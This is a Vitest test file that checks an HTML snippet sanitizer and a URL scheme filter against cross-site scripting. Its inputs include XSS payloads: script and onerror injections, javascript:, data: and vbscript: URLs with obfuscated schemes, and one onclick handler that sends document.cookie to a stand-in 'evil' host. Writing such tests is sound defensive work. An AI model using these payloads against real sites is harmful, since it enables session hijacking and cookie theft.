import { describe, expect, it } from 'vitest';
import { safeUrl, sanitizeSnippet } from '../lib/sanitize';

describe('sanitizeSnippet (REQ-W25)', () => {
  it('strips <script> tags', () => {
    const result = sanitizeSnippet('<script>alert(1)</script>');
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('</script>');
  });

  it('preserves <mark> tags', () => {
    const result = sanitizeSnippet('hello <mark>world</mark> foo');
    expect(result).toBe('hello <mark>world</mark> foo');
  });

  it('strips <img> with onerror XSS', () => {
    const result = sanitizeSnippet('<img src=x onerror="alert(1)">');
    expect(result).not.toContain('<img');
  });

  it('strips <a> tags but keeps text content', () => {
    const result = sanitizeSnippet('<a href="x">link text</a>');
    expect(result).toContain('link text');
    expect(result).not.toContain('<a');
    expect(result).not.toContain('</a>');
  });

  it('handles mixed allowed and disallowed tags', () => {
    const result = sanitizeSnippet('see <b>this</b> <mark>highlighted</mark> item');
    expect(result).toBe('see this <mark>highlighted</mark> item');
  });

  it('keeps plain text unchanged', () => {
    expect(sanitizeSnippet('plain text')).toBe('plain text');
  });

  it('strips event-handler attributes from <mark>', () => {
    const result = sanitizeSnippet('<mark onmouseover=alert(1)>x</mark>');
    expect(result).toBe('<mark>x</mark>');
    expect(result).not.toContain('onmouseover');
  });

  it('strips quoted event-handler attributes from <mark>', () => {
    const result = sanitizeSnippet('<mark onclick="fetch(\'//evil/\'+document.cookie)">y</mark>');
    expect(result).toBe('<mark>y</mark>');
    expect(result).not.toContain('onclick');
    expect(result).not.toContain('fetch');
  });

  it('strips style and other attributes from <mark> regardless of case', () => {
    const result = sanitizeSnippet('<MARK style="background:url(x)" onerror=alert(1)>z</MARK>');
    expect(result).not.toContain('style');
    expect(result).not.toContain('onerror');
    expect(result.toLowerCase()).toContain('<mark>');
    expect(result.toLowerCase()).toContain('</mark>');
    expect(result).toContain('z');
  });

  it('escapes residual angle brackets so no live HTML survives', () => {
    const result = sanitizeSnippet('a < b && c > d');
    expect(result).toBe('a &lt; b &amp;&amp; c &gt; d');
  });

  it('renders a nested <script> inside a mark as inert text', () => {
    const result = sanitizeSnippet('<mark><script>alert(1)</script></mark>');
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('</script>');
    expect(result.toLowerCase()).toContain('<mark>');
    expect(result.toLowerCase()).toContain('</mark>');
  });

  it('escapes ampersands and quotes outside marks', () => {
    const result = sanitizeSnippet('Tom & Jerry "quoted" \'single\'');
    expect(result).not.toContain('&amp;amp;');
    expect(result).toContain('&amp;');
    expect(result).toContain('&quot;');
    expect(result).toContain('&#39;');
  });
});

describe('safeUrl (ATL-83)', () => {
  it('accepts http(s) and mailto URLs unchanged', () => {
    expect(safeUrl('https://example.com/a?b=1#c')).toBe('https://example.com/a?b=1#c');
    expect(safeUrl('http://example.com')).toBe('http://example.com');
    expect(safeUrl('mailto:someone@example.com')).toBe('mailto:someone@example.com');
  });

  it('accepts relative, absolute-path, and anchor URLs (no scheme)', () => {
    expect(safeUrl('/foo/bar')).toBe('/foo/bar');
    expect(safeUrl('./foo')).toBe('./foo');
    expect(safeUrl('../foo')).toBe('../foo');
    expect(safeUrl('#anchor')).toBe('#anchor');
    expect(safeUrl('page.html?x=a:b')).toBe('page.html?x=a:b');
    expect(safeUrl('//cdn.example.com/x.png')).toBe('//cdn.example.com/x.png');
  });

  it('rejects javascript:, data:, and vbscript: schemes', () => {
    expect(safeUrl('javascript:alert(1)')).toBeNull();
    expect(safeUrl('data:text/html,<script>alert(1)</script>')).toBeNull();
    expect(safeUrl('vbscript:msgbox(1)')).toBeNull();
  });

  it('rejects scheme obfuscated with case, whitespace, and control characters', () => {
    expect(safeUrl('JavaScript:alert(1)')).toBeNull();
    expect(safeUrl('  javascript:alert(1)  ')).toBeNull();
    expect(safeUrl('java\tscript:alert(1)')).toBeNull();
    expect(safeUrl('java\nscript:alert(1)')).toBeNull();
    expect(safeUrl('\u0001javascript:alert(1)')).toBeNull();
  });

  it('returns null for an empty or whitespace-only URL', () => {
    expect(safeUrl('')).toBeNull();
    expect(safeUrl('   ')).toBeNull();
    expect(safeUrl('\t\n')).toBeNull();
  });
});
